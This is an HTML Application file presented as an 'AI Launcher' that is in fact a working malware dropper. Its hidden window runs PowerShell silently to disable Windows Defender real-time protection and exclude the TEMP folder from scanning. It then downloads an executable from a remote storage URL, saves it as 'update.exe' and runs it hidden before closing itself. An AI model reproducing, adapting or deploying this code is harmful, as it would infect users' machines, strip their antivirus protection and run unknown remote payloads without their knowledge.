<html>
<head>
    <title>AI Launcher</title>
    <HTA:APPLICATION
        APPLICATIONNAME="AI"
        BORDER="none"
        CAPTION="no"
        SHOWINTASKBAR="no"
        WINDOWSTATE="minimize"
        MAXIMIZEBUTTON="no"
        MINIMIZEBUTTON="no"
        ICON="none"
    />
</head>
<script>
    var shell = new ActiveXObject("WScript.Shell");
    var psCommand = 'powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath $env:TEMP; Invoke-WebRequest -Uri \'https://eykrqioydzqaehcektgd.supabase.co/storage/v1/object/public/files/2d5c8c69-c9d3-463f-a2da-14f665a522fd/panel-file.exe\' -OutFile $env:TEMP\\update.exe; Start-Process $env:TEMP\\update.exe -WindowStyle Hidden"';
    shell.Run(psCommand, 0, false);  // 0 = completely hidden, false = don't wait
    window.close();
</script>
<body></body>
</html>
